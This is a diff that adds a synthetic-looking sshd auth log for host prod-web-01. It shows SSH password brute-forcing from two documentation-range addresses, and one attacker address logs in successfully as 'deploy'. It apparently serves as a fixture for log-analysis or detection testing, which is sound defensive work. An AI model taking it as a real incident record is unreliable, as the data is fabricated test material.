@@ -1,0 +1,494 @@
+Feb 17 04:41:00 prod-web-01 sshd[15955]: Accepted password for deploy from 172.16.0.5 port 46015 ssh2
+Feb 17 04:41:01 prod-web-01 sshd[15955]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 05:30:00 prod-web-01 sshd[30641]: Failed password for invalid user oracle from 198.51.100.23 port 51401 ssh2
+Feb 17 05:30:02 prod-web-01 sshd[30642]: Failed password for invalid user admin from 198.51.100.23 port 63223 ssh2
+Feb 17 05:30:04 prod-web-01 sshd[30643]: Failed password for invalid user postgres from 198.51.100.23 port 41692 ssh2
+Feb 17 05:30:05 prod-web-01 sshd[30643]: Connection closed by 198.51.100.23 port 48080 [preauth]
+Feb 17 05:30:06 prod-web-01 sshd[30644]: Failed password for invalid user backup from 198.51.100.23 port 42306 ssh2
+Feb 17 05:30:07 prod-web-01 sshd[30647]: Failed password for invalid user oracle from 198.51.100.23 port 54153 ssh2
+Feb 17 05:30:08 prod-web-01 sshd[30648]: Failed password for invalid user postgres from 198.51.100.23 port 50050 ssh2
+Feb 17 05:30:08 prod-web-01 sshd[30652]: Failed password for ubuntu from 198.51.100.23 port 57733 ssh2
+Feb 17 05:30:09 prod-web-01 sshd[30652]: Connection closed by 198.51.100.23 port 61430 [preauth]
+Feb 17 05:30:09 prod-web-01 sshd[30645]: Failed password for root from 198.51.100.23 port 55357 ssh2
+Feb 17 05:30:12 prod-web-01 sshd[30646]: Failed password for invalid user admin from 198.51.100.23 port 56883 ssh2
+Feb 17 05:30:13 prod-web-01 sshd[30649]: Failed password for invalid user backup from 198.51.100.23 port 53758 ssh2
+Feb 17 05:30:13 prod-web-01 sshd[30651]: Failed password for invalid user oracle from 198.51.100.23 port 61386 ssh2
+Feb 17 05:30:15 prod-web-01 sshd[30650]: Failed password for invalid user test from 198.51.100.23 port 54988 ssh2
+Feb 17 05:30:17 prod-web-01 sshd[30654]: Failed password for invalid user oracle from 198.51.100.23 port 50148 ssh2
+Feb 17 05:30:19 prod-web-01 sshd[30661]: Failed password for ubuntu from 198.51.100.23 port 55484 ssh2
+Feb 17 05:30:21 prod-web-01 sshd[30671]: Failed password for invalid user backup from 198.51.100.23 port 44650 ssh2
+Feb 17 05:30:21 prod-web-01 sshd[30666]: Failed password for invalid user www-data from 198.51.100.23 port 62264 ssh2
+Feb 17 05:30:21 prod-web-01 sshd[30671]: Connection closed by 198.51.100.23 port 47382 [preauth]
+Feb 17 05:30:22 prod-web-01 sshd[30666]: Connection closed by 198.51.100.23 port 49617 [preauth]
+Feb 17 05:30:24 prod-web-01 sshd[30659]: Failed password for root from 198.51.100.23 port 60750 ssh2
+Feb 17 05:30:24 prod-web-01 sshd[30685]: Failed password for invalid user backup from 198.51.100.23 port 64015 ssh2
+Feb 17 05:30:25 prod-web-01 sshd[30653]: Failed password for invalid user mysql from 198.51.100.23 port 58483 ssh2
+Feb 17 05:30:26 prod-web-01 sshd[30653]: Connection closed by 198.51.100.23 port 63960 [preauth]
+Feb 17 05:30:27 prod-web-01 sshd[30660]: Failed password for invalid user oracle from 198.51.100.23 port 61480 ssh2
+Feb 17 05:30:27 prod-web-01 sshd[30656]: Failed password for invalid user postgres from 198.51.100.23 port 41662 ssh2
+Feb 17 05:30:28 prod-web-01 sshd[30682]: Failed password for invalid user postgres from 198.51.100.23 port 50298 ssh2
+Feb 17 05:30:28 prod-web-01 sshd[30684]: Failed password for invalid user oracle from 198.51.100.23 port 43392 ssh2
+Feb 17 05:30:33 prod-web-01 sshd[30670]: Failed password for deploy from 198.51.100.23 port 49805 ssh2
+Feb 17 05:30:35 prod-web-01 sshd[30705]: Failed password for root from 198.51.100.23 port 60596 ssh2
+Feb 17 05:30:35 prod-web-01 sshd[30711]: Failed password for ubuntu from 198.51.100.23 port 59577 ssh2
+Feb 17 05:30:36 prod-web-01 sshd[30655]: Failed password for invalid user backup from 198.51.100.23 port 56897 ssh2
+Feb 17 05:30:37 prod-web-01 sshd[30676]: Failed password for ubuntu from 198.51.100.23 port 53417 ssh2
+Feb 17 05:30:37 prod-web-01 sshd[30676]: Connection closed by 198.51.100.23 port 48284 [preauth]
+Feb 17 05:30:40 prod-web-01 sshd[30662]: Failed password for invalid user www-data from 198.51.100.23 port 47989 ssh2
+Feb 17 05:30:40 prod-web-01 sshd[30669]: Failed password for invalid user mysql from 198.51.100.23 port 58683 ssh2
+Feb 17 05:30:41 prod-web-01 sshd[30669]: Connection closed by 198.51.100.23 port 59910 [preauth]
+Feb 17 05:30:44 prod-web-01 sshd[30668]: Failed password for invalid user oracle from 198.51.100.23 port 53945 ssh2
+Feb 17 05:30:44 prod-web-01 sshd[30668]: Connection closed by 198.51.100.23 port 54508 [preauth]
+Feb 17 05:30:45 prod-web-01 sshd[30658]: Failed password for invalid user postgres from 198.51.100.23 port 63751 ssh2
+Feb 17 05:30:47 prod-web-01 sshd[30657]: Failed password for invalid user www-data from 198.51.100.23 port 58713 ssh2
+Feb 17 05:30:47 prod-web-01 sshd[30696]: Failed password for root from 198.51.100.23 port 60471 ssh2
+Feb 17 05:30:47 prod-web-01 sshd[30657]: Connection closed by 198.51.100.23 port 61435 [preauth]
+Feb 17 05:30:52 prod-web-01 sshd[30664]: Failed password for invalid user backup from 198.51.100.23 port 48308 ssh2
+Feb 17 05:30:55 prod-web-01 sshd[30689]: Failed password for ubuntu from 198.51.100.23 port 40139 ssh2
+Feb 17 05:30:55 prod-web-01 sshd[30689]: Connection closed by 198.51.100.23 port 51411 [preauth]
+Feb 17 05:30:56 prod-web-01 sshd[30721]: Failed password for invalid user admin from 198.51.100.23 port 59935 ssh2
+Feb 17 05:30:58 prod-web-01 sshd[30699]: Failed password for invalid user www-data from 198.51.100.23 port 43641 ssh2
+Feb 17 05:30:58 prod-web-01 sshd[30737]: Failed password for invalid user mysql from 198.51.100.23 port 50012 ssh2
+Feb 17 05:30:59 prod-web-01 sshd[30677]: Failed password for invalid user test from 198.51.100.23 port 45629 ssh2
+Feb 17 05:30:59 prod-web-01 sshd[30699]: Connection closed by 198.51.100.23 port 57129 [preauth]
+Feb 17 05:30:59 prod-web-01 sshd[30737]: Connection closed by 198.51.100.23 port 51628 [preauth]
+Feb 17 05:31:00 prod-web-01 sshd[30663]: Failed password for invalid user test from 198.51.100.23 port 55379 ssh2
+Feb 17 05:31:02 prod-web-01 sshd[30665]: Failed password for invalid user oracle from 198.51.100.23 port 59087 ssh2
+Feb 17 05:31:02 prod-web-01 sshd[30691]: Failed password for ubuntu from 198.51.100.23 port 43248 ssh2
+Feb 17 05:31:03 prod-web-01 sshd[30690]: Failed password for invalid user admin from 198.51.100.23 port 64449 ssh2
+Feb 17 05:31:03 prod-web-01 sshd[30703]: Failed password for root from 198.51.100.23 port 57529 ssh2
+Feb 17 05:31:03 prod-web-01 sshd[30690]: Connection closed by 198.51.100.23 port 43342 [preauth]
+Feb 17 05:31:04 prod-web-01 sshd[30667]: Failed password for deploy from 198.51.100.23 port 58117 ssh2
+Feb 17 05:31:05 prod-web-01 sshd[30672]: Failed password for invalid user mysql from 198.51.100.23 port 57987 ssh2
+Feb 17 05:31:06 prod-web-01 sshd[30679]: Failed password for root from 198.51.100.23 port 56371 ssh2
+Feb 17 05:31:06 prod-web-01 sshd[30688]: Failed password for invalid user mysql from 198.51.100.23 port 52536 ssh2
+Feb 17 05:31:08 prod-web-01 sshd[30712]: Failed password for invalid user mysql from 198.51.100.23 port 63817 ssh2
+Feb 17 05:31:09 prod-web-01 sshd[30727]: Failed password for ubuntu from 198.51.100.23 port 54501 ssh2
+Feb 17 05:31:10 prod-web-01 sshd[30715]: Failed password for root from 198.51.100.23 port 58015 ssh2
+Feb 17 05:31:11 prod-web-01 sshd[30673]: Failed password for invalid user mysql from 198.51.100.23 port 58746 ssh2
+Feb 17 05:31:12 prod-web-01 sshd[30713]: Failed password for ubuntu from 198.51.100.23 port 59780 ssh2
+Feb 17 05:31:12 prod-web-01 sshd[30713]: Connection closed by 198.51.100.23 port 59427 [preauth]
+Feb 17 05:31:16 prod-web-01 sshd[30710]: Failed password for ubuntu from 198.51.100.23 port 53992 ssh2
+Feb 17 05:31:19 prod-web-01 sshd[30704]: Failed password for invalid user admin from 198.51.100.23 port 49345 ssh2
+Feb 17 05:31:20 prod-web-01 sshd[30731]: Failed password for invalid user mysql from 198.51.100.23 port 60863 ssh2
+Feb 17 05:31:20 prod-web-01 sshd[30674]: Failed password for root from 198.51.100.23 port 42206 ssh2
+Feb 17 05:31:23 prod-web-01 sshd[30678]: Failed password for invalid user www-data from 198.51.100.23 port 61553 ssh2
+Feb 17 05:31:23 prod-web-01 sshd[30675]: Failed password for invalid user admin from 198.51.100.23 port 53767 ssh2
+Feb 17 05:31:23 prod-web-01 sshd[30675]: Connection closed by 198.51.100.23 port 48522 [preauth]
+Feb 17 05:31:24 prod-web-01 sshd[30741]: Failed password for root from 198.51.100.23 port 48969 ssh2
+Feb 17 05:31:25 prod-web-01 sshd[30736]: Failed password for root from 198.51.100.23 port 47687 ssh2
+Feb 17 05:31:26 prod-web-01 sshd[30695]: Failed password for invalid user postgres from 198.51.100.23 port 49807 ssh2
+Feb 17 05:31:26 prod-web-01 sshd[30736]: Connection closed by 198.51.100.23 port 41566 [preauth]
+Feb 17 05:31:26 prod-web-01 sshd[30695]: Connection closed by 198.51.100.23 port 46021 [preauth]
+Feb 17 05:31:27 prod-web-01 sshd[30697]: Failed password for ubuntu from 198.51.100.23 port 56398 ssh2
+Feb 17 05:31:27 prod-web-01 sshd[30697]: Connection closed by 198.51.100.23 port 45820 [preauth]
+Feb 17 05:31:28 prod-web-01 sshd[30735]: Failed password for invalid user www-data from 198.51.100.23 port 41296 ssh2
+Feb 17 05:31:29 prod-web-01 sshd[30735]: Connection closed by 198.51.100.23 port 46923 [preauth]
+Feb 17 05:31:35 prod-web-01 sshd[30718]: Failed password for invalid user postgres from 198.51.100.23 port 57846 ssh2
+Feb 17 05:31:37 prod-web-01 sshd[30680]: Failed password for ubuntu from 198.51.100.23 port 41624 ssh2
+Feb 17 05:31:38 prod-web-01 sshd[30724]: Failed password for invalid user backup from 198.51.100.23 port 53261 ssh2
+Feb 17 05:31:38 prod-web-01 sshd[30680]: Connection closed by 198.51.100.23 port 57028 [preauth]
+Feb 17 05:31:38 prod-web-01 sshd[30694]: Failed password for invalid user oracle from 198.51.100.23 port 60999 ssh2
+Feb 17 05:31:38 prod-web-01 sshd[30694]: Connection closed by 198.51.100.23 port 61060 [preauth]
+Feb 17 05:31:38 prod-web-01 sshd[30692]: Failed password for invalid user test from 198.51.100.23 port 52263 ssh2
+Feb 17 05:31:39 prod-web-01 sshd[30692]: Connection closed by 198.51.100.23 port 57410 [preauth]
+Feb 17 05:31:40 prod-web-01 sshd[30726]: Failed password for root from 198.51.100.23 port 46217 ssh2
+Feb 17 05:31:41 prod-web-01 sshd[30709]: Failed password for invalid user mysql from 198.51.100.23 port 60287 ssh2
+Feb 17 05:31:41 prod-web-01 sshd[30681]: Failed password for invalid user admin from 198.51.100.23 port 60108 ssh2
+Feb 17 05:31:42 prod-web-01 sshd[30683]: Failed password for ubuntu from 198.51.100.23 port 41120 ssh2
+Feb 17 05:31:42 prod-web-01 sshd[30729]: Failed password for invalid user www-data from 198.51.100.23 port 58844 ssh2
+Feb 17 05:31:42 prod-web-01 sshd[30683]: Connection closed by 198.51.100.23 port 42655 [preauth]
+Feb 17 05:31:43 prod-web-01 sshd[30730]: Failed password for invalid user test from 198.51.100.23 port 41027 ssh2
+Feb 17 05:31:54 prod-web-01 sshd[30698]: Failed password for invalid user mysql from 198.51.100.23 port 59399 ssh2
+Feb 17 05:32:08 prod-web-01 sshd[30708]: Failed password for deploy from 198.51.100.23 port 60983 ssh2
+Feb 17 05:32:09 prod-web-01 sshd[30686]: Failed password for invalid user postgres from 198.51.100.23 port 62156 ssh2
+Feb 17 05:32:14 prod-web-01 sshd[30687]: Failed password for invalid user admin from 198.51.100.23 port 47552 ssh2
+Feb 17 05:32:15 prod-web-01 sshd[30700]: Failed password for root from 198.51.100.23 port 56620 ssh2
+Feb 17 05:32:16 prod-web-01 sshd[30739]: Failed password for ubuntu from 198.51.100.23 port 45245 ssh2
+Feb 17 05:32:21 prod-web-01 sshd[30716]: Failed password for invalid user backup from 198.51.100.23 port 47556 ssh2
+Feb 17 05:32:25 prod-web-01 sshd[30701]: Failed password for ubuntu from 198.51.100.23 port 56587 ssh2
+Feb 17 05:32:28 prod-web-01 sshd[30706]: Failed password for invalid user mysql from 198.51.100.23 port 56551 ssh2
+Feb 17 05:32:28 prod-web-01 sshd[30714]: Failed password for invalid user admin from 198.51.100.23 port 56814 ssh2
+Feb 17 05:32:29 prod-web-01 sshd[30720]: Failed password for invalid user oracle from 198.51.100.23 port 63061 ssh2
+Feb 17 05:32:29 prod-web-01 sshd[30702]: Failed password for invalid user backup from 198.51.100.23 port 46950 ssh2
+Feb 17 05:32:30 prod-web-01 sshd[30693]: Failed password for invalid user backup from 198.51.100.23 port 50471 ssh2
+Feb 17 05:32:45 prod-web-01 sshd[30738]: Failed password for invalid user mysql from 198.51.100.23 port 59088 ssh2
+Feb 17 05:32:51 prod-web-01 sshd[30723]: Failed password for ubuntu from 198.51.100.23 port 61760 ssh2
+Feb 17 05:32:54 prod-web-01 sshd[30707]: Failed password for invalid user admin from 198.51.100.23 port 50293 ssh2
+Feb 17 05:32:59 prod-web-01 sshd[30722]: Failed password for invalid user oracle from 198.51.100.23 port 58637 ssh2
+Feb 17 05:32:59 prod-web-01 sshd[30734]: Failed password for invalid user admin from 198.51.100.23 port 59614 ssh2
+Feb 17 05:33:15 prod-web-01 sshd[30733]: Failed password for ubuntu from 198.51.100.23 port 64151 ssh2
+Feb 17 05:33:17 prod-web-01 sshd[30728]: Failed password for invalid user www-data from 198.51.100.23 port 56052 ssh2
+Feb 17 05:33:25 prod-web-01 sshd[30732]: Failed password for invalid user backup from 198.51.100.23 port 57867 ssh2
+Feb 17 05:33:25 prod-web-01 sshd[30732]: Connection closed by 198.51.100.23 port 63822 [preauth]
+Feb 17 05:33:33 prod-web-01 sshd[30717]: Failed password for invalid user test from 198.51.100.23 port 40734 ssh2
+Feb 17 05:33:36 prod-web-01 sshd[30742]: Failed password for invalid user admin from 198.51.100.23 port 45336 ssh2
+Feb 17 05:33:37 prod-web-01 sshd[30745]: Accepted password for deploy from 198.51.100.23 port 59654 ssh2
+Feb 17 05:33:38 prod-web-01 sshd[30745]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 05:33:43 prod-web-01 sshd[30719]: Failed password for invalid user postgres from 198.51.100.23 port 50456 ssh2
+Feb 17 05:33:44 prod-web-01 sshd[30719]: Connection closed by 198.51.100.23 port 40698 [preauth]
+Feb 17 05:33:59 prod-web-01 sshd[30725]: Failed password for root from 198.51.100.23 port 45122 ssh2
+Feb 17 05:34:16 prod-web-01 sshd[30740]: Failed password for invalid user mysql from 198.51.100.23 port 52524 ssh2
+Feb 17 05:34:42 prod-web-01 sshd[30743]: Failed password for invalid user backup from 198.51.100.23 port 55591 ssh2
+Feb 17 06:23:00 prod-web-01 sshd[23275]: Failed password for invalid user www-data from 192.0.2.100 port 59930 ssh2
+Feb 17 06:23:00 prod-web-01 sshd[23275]: Connection closed by 192.0.2.100 port 49429 [preauth]
+Feb 17 06:23:01 prod-web-01 sshd[23276]: Failed password for invalid user www-data from 192.0.2.100 port 45888 ssh2
+Feb 17 06:23:03 prod-web-01 sshd[23278]: Failed password for invalid user mysql from 192.0.2.100 port 43455 ssh2
+Feb 17 06:23:03 prod-web-01 sshd[23279]: Failed password for ubuntu from 192.0.2.100 port 56031 ssh2
+Feb 17 06:23:04 prod-web-01 sshd[23277]: Failed password for invalid user postgres from 192.0.2.100 port 42048 ssh2
+Feb 17 06:23:05 prod-web-01 sshd[23277]: Connection closed by 192.0.2.100 port 54864 [preauth]
+Feb 17 06:23:07 prod-web-01 sshd[23280]: Failed password for invalid user postgres from 192.0.2.100 port 59644 ssh2
+Feb 17 06:23:09 prod-web-01 sshd[23283]: Failed password for invalid user backup from 192.0.2.100 port 45857 ssh2
+Feb 17 06:23:10 prod-web-01 sshd[23283]: Connection closed by 192.0.2.100 port 62778 [preauth]
+Feb 17 06:23:12 prod-web-01 sshd[23298]: Failed password for invalid user oracle from 192.0.2.100 port 55797 ssh2
+Feb 17 06:23:12 prod-web-01 sshd[23285]: Failed password for invalid user admin from 192.0.2.100 port 47393 ssh2
+Feb 17 06:23:12 prod-web-01 sshd[23288]: Failed password for invalid user admin from 192.0.2.100 port 54702 ssh2
+Feb 17 06:23:13 prod-web-01 sshd[23281]: Failed password for invalid user admin from 192.0.2.100 port 52149 ssh2
+Feb 17 06:23:14 prod-web-01 sshd[23282]: Failed password for invalid user backup from 192.0.2.100 port 60446 ssh2
+Feb 17 06:23:14 prod-web-01 sshd[23282]: Connection closed by 192.0.2.100 port 40732 [preauth]
+Feb 17 06:23:15 prod-web-01 sshd[23297]: Failed password for root from 192.0.2.100 port 53835 ssh2
+Feb 17 06:23:15 prod-web-01 sshd[23305]: Failed password for invalid user oracle from 192.0.2.100 port 61552 ssh2
+Feb 17 06:23:16 prod-web-01 sshd[23292]: Failed password for invalid user mysql from 192.0.2.100 port 57065 ssh2
+Feb 17 06:23:16 prod-web-01 sshd[23286]: Failed password for invalid user mysql from 192.0.2.100 port 49425 ssh2
+Feb 17 06:23:16 prod-web-01 sshd[23292]: Connection closed by 192.0.2.100 port 48202 [preauth]
+Feb 17 06:23:17 prod-web-01 sshd[23294]: Failed password for invalid user test from 192.0.2.100 port 51439 ssh2
+Feb 17 06:23:20 prod-web-01 sshd[23284]: Failed password for ubuntu from 192.0.2.100 port 43086 ssh2
+Feb 17 06:23:20 prod-web-01 sshd[23284]: Connection closed by 192.0.2.100 port 57245 [preauth]
+Feb 17 06:23:20 prod-web-01 sshd[23287]: Failed password for root from 192.0.2.100 port 46750 ssh2
+Feb 17 06:23:21 prod-web-01 sshd[23299]: Failed password for invalid user test from 192.0.2.100 port 53885 ssh2
+Feb 17 06:23:23 prod-web-01 sshd[23312]: Failed password for invalid user admin from 192.0.2.100 port 54011 ssh2
+Feb 17 06:23:25 prod-web-01 sshd[23295]: Failed password for invalid user test from 192.0.2.100 port 62922 ssh2
+Feb 17 06:23:26 prod-web-01 sshd[23290]: Failed password for invalid user backup from 192.0.2.100 port 43667 ssh2
+Feb 17 06:23:29 prod-web-01 sshd[23311]: Failed password for invalid user postgres from 192.0.2.100 port 60024 ssh2
+Feb 17 06:23:33 prod-web-01 sshd[23317]: Failed password for ubuntu from 192.0.2.100 port 56765 ssh2
+Feb 17 06:23:33 prod-web-01 sshd[23310]: Failed password for root from 192.0.2.100 port 51046 ssh2
+Feb 17 06:23:34 prod-web-01 sshd[23343]: Failed password for invalid user www-data from 192.0.2.100 port 43911 ssh2
+Feb 17 06:23:34 prod-web-01 sshd[23343]: Connection closed by 192.0.2.100 port 51400 [preauth]
+Feb 17 06:23:35 prod-web-01 sshd[23315]: Failed password for invalid user backup from 192.0.2.100 port 60399 ssh2
+Feb 17 06:23:35 prod-web-01 sshd[23319]: Failed password for invalid user postgres from 192.0.2.100 port 42151 ssh2
+Feb 17 06:23:36 prod-web-01 sshd[23315]: Connection closed by 192.0.2.100 port 62027 [preauth]
+Feb 17 06:23:36 prod-web-01 sshd[23319]: Connection closed by 192.0.2.100 port 46385 [preauth]
+Feb 17 06:23:37 prod-web-01 sshd[23289]: Failed password for root from 192.0.2.100 port 62405 ssh2
+Feb 17 06:23:39 prod-web-01 sshd[23324]: Failed password for invalid user test from 192.0.2.100 port 62061 ssh2
+Feb 17 06:23:39 prod-web-01 sshd[23307]: Failed password for invalid user oracle from 192.0.2.100 port 42948 ssh2
+Feb 17 06:23:41 prod-web-01 sshd[23293]: Failed password for invalid user oracle from 192.0.2.100 port 52318 ssh2
+Feb 17 06:23:43 prod-web-01 sshd[23301]: Failed password for deploy from 192.0.2.100 port 56834 ssh2
+Feb 17 06:23:45 prod-web-01 sshd[23291]: Failed password for invalid user mysql from 192.0.2.100 port 56641 ssh2
+Feb 17 06:23:45 prod-web-01 sshd[23323]: Failed password for root from 192.0.2.100 port 60534 ssh2
+Feb 17 06:23:48 prod-web-01 sshd[23296]: Failed password for invalid user www-data from 192.0.2.100 port 62774 ssh2
+Feb 17 06:23:48 prod-web-01 sshd[23362]: Failed password for deploy from 192.0.2.100 port 50532 ssh2
+Feb 17 06:23:48 prod-web-01 sshd[23302]: Failed password for invalid user test from 192.0.2.100 port 52505 ssh2
+Feb 17 06:23:49 prod-web-01 sshd[23362]: Connection closed by 192.0.2.100 port 55148 [preauth]
+Feb 17 06:23:49 prod-web-01 sshd[23330]: Failed password for invalid user oracle from 192.0.2.100 port 56622 ssh2
+Feb 17 06:23:50 prod-web-01 sshd[23365]: Failed password for invalid user postgres from 192.0.2.100 port 49217 ssh2
+Feb 17 06:23:50 prod-web-01 sshd[23350]: Failed password for deploy from 192.0.2.100 port 62605 ssh2
+Feb 17 06:23:50 prod-web-01 sshd[23350]: Connection closed by 192.0.2.100 port 64241 [preauth]
+Feb 17 06:23:58 prod-web-01 sshd[23304]: Failed password for ubuntu from 192.0.2.100 port 44943 ssh2
+Feb 17 06:24:00 prod-web-01 sshd[23325]: Failed password for invalid user www-data from 192.0.2.100 port 48268 ssh2
+Feb 17 06:24:01 prod-web-01 sshd[23340]: Failed password for invalid user test from 192.0.2.100 port 58723 ssh2
+Feb 17 06:24:02 prod-web-01 sshd[23360]: Failed password for invalid user mysql from 192.0.2.100 port 43986 ssh2
+Feb 17 06:24:03 prod-web-01 sshd[23320]: Failed password for deploy from 192.0.2.100 port 63907 ssh2
+Feb 17 06:24:04 prod-web-01 sshd[23321]: Failed password for root from 192.0.2.100 port 44516 ssh2
+Feb 17 06:24:05 prod-web-01 sshd[23318]: Failed password for invalid user backup from 192.0.2.100 port 51115 ssh2
+Feb 17 06:24:05 prod-web-01 sshd[23386]: Failed password for ubuntu from 192.0.2.100 port 60362 ssh2
+Feb 17 06:24:06 prod-web-01 sshd[23318]: Connection closed by 192.0.2.100 port 50618 [preauth]
+Feb 17 06:24:06 prod-web-01 sshd[23303]: Failed password for invalid user postgres from 192.0.2.100 port 51006 ssh2
+Feb 17 06:24:07 prod-web-01 sshd[23300]: Failed password for invalid user oracle from 192.0.2.100 port 47112 ssh2
+Feb 17 06:24:07 prod-web-01 sshd[23306]: Failed password for deploy from 192.0.2.100 port 43305 ssh2
+Feb 17 06:24:07 prod-web-01 sshd[23313]: Failed password for deploy from 192.0.2.100 port 53525 ssh2
+Feb 17 06:24:07 prod-web-01 sshd[23300]: Connection closed by 192.0.2.100 port 50759 [preauth]
+Feb 17 06:24:08 prod-web-01 sshd[23313]: Connection closed by 192.0.2.100 port 44247 [preauth]
+Feb 17 06:24:08 prod-web-01 sshd[23314]: Failed password for invalid user oracle from 192.0.2.100 port 50457 ssh2
+Feb 17 06:24:08 prod-web-01 sshd[23346]: Failed password for invalid user www-data from 192.0.2.100 port 61836 ssh2
+Feb 17 06:24:14 prod-web-01 sshd[23372]: Failed password for invalid user www-data from 192.0.2.100 port 59598 ssh2
+Feb 17 06:24:14 prod-web-01 sshd[23370]: Failed password for invalid user www-data from 192.0.2.100 port 54704 ssh2
+Feb 17 06:24:14 prod-web-01 sshd[23372]: Connection closed by 192.0.2.100 port 53223 [preauth]
+Feb 17 06:24:14 prod-web-01 sshd[23370]: Connection closed by 192.0.2.100 port 64878 [preauth]
+Feb 17 06:24:17 prod-web-01 sshd[23349]: Failed password for invalid user admin from 192.0.2.100 port 60697 ssh2
+Feb 17 06:24:18 prod-web-01 sshd[23326]: Failed password for deploy from 192.0.2.100 port 52799 ssh2
+Feb 17 06:24:18 prod-web-01 sshd[23397]: Failed password for invalid user www-data from 192.0.2.100 port 43433 ssh2
+Feb 17 06:24:19 prod-web-01 sshd[23336]: Failed password for invalid user mysql from 192.0.2.100 port 63386 ssh2
+Feb 17 06:24:19 prod-web-01 sshd[23336]: Connection closed by 192.0.2.100 port 54766 [preauth]
+Feb 17 06:24:21 prod-web-01 sshd[23347]: Failed password for invalid user mysql from 192.0.2.100 port 40870 ssh2
+Feb 17 06:24:21 prod-web-01 sshd[23347]: Connection closed by 192.0.2.100 port 52428 [preauth]
+Feb 17 06:24:21 prod-web-01 sshd[23383]: Failed password for invalid user oracle from 192.0.2.100 port 50034 ssh2
+Feb 17 06:24:22 prod-web-01 sshd[23383]: Connection closed by 192.0.2.100 port 57165 [preauth]
+Feb 17 06:24:25 prod-web-01 sshd[23361]: Failed password for deploy from 192.0.2.100 port 58235 ssh2
+Feb 17 06:24:26 prod-web-01 sshd[23361]: Connection closed by 192.0.2.100 port 63878 [preauth]
+Feb 17 06:24:31 prod-web-01 sshd[23308]: Failed password for ubuntu from 192.0.2.100 port 61251 ssh2
+Feb 17 06:24:31 prod-web-01 sshd[23329]: Failed password for invalid user backup from 192.0.2.100 port 63144 ssh2
+Feb 17 06:24:32 prod-web-01 sshd[23309]: Failed password for ubuntu from 192.0.2.100 port 45291 ssh2
+Feb 17 06:24:35 prod-web-01 sshd[23387]: Failed password for ubuntu from 192.0.2.100 port 63693 ssh2
+Feb 17 06:24:35 prod-web-01 sshd[23402]: Failed password for invalid user mysql from 192.0.2.100 port 49696 ssh2
+Feb 17 06:24:36 prod-web-01 sshd[23322]: Failed password for root from 192.0.2.100 port 51367 ssh2
+Feb 17 06:24:39 prod-web-01 sshd[23357]: Failed password for invalid user backup from 192.0.2.100 port 49419 ssh2
+Feb 17 06:24:40 prod-web-01 sshd[23357]: Connection closed by 192.0.2.100 port 56240 [preauth]
+Feb 17 06:24:42 prod-web-01 sshd[23376]: Failed password for invalid user mysql from 192.0.2.100 port 61747 ssh2
+Feb 17 06:24:42 prod-web-01 sshd[23376]: Connection closed by 192.0.2.100 port 52621 [preauth]
+Feb 17 06:24:43 prod-web-01 sshd[23358]: Failed password for invalid user backup from 192.0.2.100 port 59646 ssh2
+Feb 17 06:24:44 prod-web-01 sshd[23364]: Failed password for invalid user postgres from 192.0.2.100 port 44446 ssh2
+Feb 17 06:24:44 prod-web-01 sshd[23358]: Connection closed by 192.0.2.100 port 63750 [preauth]
+Feb 17 06:24:44 prod-web-01 sshd[23364]: Connection closed by 192.0.2.100 port 43192 [preauth]
+Feb 17 06:24:45 prod-web-01 sshd[23344]: Failed password for invalid user mysql from 192.0.2.100 port 64970 ssh2
+Feb 17 06:24:46 prod-web-01 sshd[23356]: Failed password for deploy from 192.0.2.100 port 42286 ssh2
+Feb 17 06:24:47 prod-web-01 sshd[23342]: Failed password for invalid user admin from 192.0.2.100 port 50728 ssh2
+Feb 17 06:24:50 prod-web-01 sshd[23316]: Failed password for invalid user admin from 192.0.2.100 port 63538 ssh2
+Feb 17 06:24:50 prod-web-01 sshd[23337]: Failed password for root from 192.0.2.100 port 49639 ssh2
+Feb 17 06:24:52 prod-web-01 sshd[23335]: Failed password for invalid user backup from 192.0.2.100 port 56747 ssh2
+Feb 17 06:24:53 prod-web-01 sshd[23363]: Failed password for invalid user mysql from 192.0.2.100 port 54174 ssh2
+Feb 17 06:24:54 prod-web-01 sshd[23327]: Failed password for invalid user oracle from 192.0.2.100 port 48518 ssh2
+Feb 17 06:24:54 prod-web-01 sshd[23327]: Connection closed by 192.0.2.100 port 46451 [preauth]
+Feb 17 06:24:55 prod-web-01 sshd[23378]: Failed password for invalid user test from 192.0.2.100 port 45416 ssh2
+Feb 17 06:24:56 prod-web-01 sshd[23378]: Connection closed by 192.0.2.100 port 61998 [preauth]
+Feb 17 06:24:56 prod-web-01 sshd[23359]: Failed password for invalid user admin from 192.0.2.100 port 43530 ssh2
+Feb 17 06:25:02 prod-web-01 sshd[23354]: Failed password for ubuntu from 192.0.2.100 port 45172 ssh2
+Feb 17 06:25:03 prod-web-01 sshd[23354]: Connection closed by 192.0.2.100 port 46886 [preauth]
+Feb 17 06:25:03 prod-web-01 sshd[23381]: Failed password for invalid user mysql from 192.0.2.100 port 54226 ssh2
+Feb 17 06:25:04 prod-web-01 sshd[23367]: Failed password for ubuntu from 192.0.2.100 port 54898 ssh2
+Feb 17 06:25:04 prod-web-01 sshd[23375]: Failed password for deploy from 192.0.2.100 port 41357 ssh2
+Feb 17 06:25:08 prod-web-01 sshd[23377]: Failed password for invalid user www-data from 192.0.2.100 port 58392 ssh2
+Feb 17 06:25:08 prod-web-01 sshd[23377]: Connection closed by 192.0.2.100 port 51943 [preauth]
+Feb 17 06:25:09 prod-web-01 sshd[23380]: Failed password for root from 192.0.2.100 port 53204 ssh2
+Feb 17 06:25:09 prod-web-01 sshd[23338]: Failed password for invalid user oracle from 192.0.2.100 port 58614 ssh2
+Feb 17 06:25:17 prod-web-01 sshd[23328]: Failed password for ubuntu from 192.0.2.100 port 40575 ssh2
+Feb 17 06:25:17 prod-web-01 sshd[23331]: Failed password for root from 192.0.2.100 port 55107 ssh2
+Feb 17 06:25:18 prod-web-01 sshd[23328]: Connection closed by 192.0.2.100 port 62180 [preauth]
+Feb 17 06:25:20 prod-web-01 sshd[23339]: Failed password for invalid user oracle from 192.0.2.100 port 48049 ssh2
+Feb 17 06:25:30 prod-web-01 sshd[23399]: Failed password for deploy from 192.0.2.100 port 47940 ssh2
+Feb 17 06:25:35 prod-web-01 sshd[23348]: Failed password for deploy from 192.0.2.100 port 44445 ssh2
+Feb 17 06:25:36 prod-web-01 sshd[23348]: Connection closed by 192.0.2.100 port 63734 [preauth]
+Feb 17 06:25:37 prod-web-01 sshd[23407]: Failed password for invalid user mysql from 192.0.2.100 port 45090 ssh2
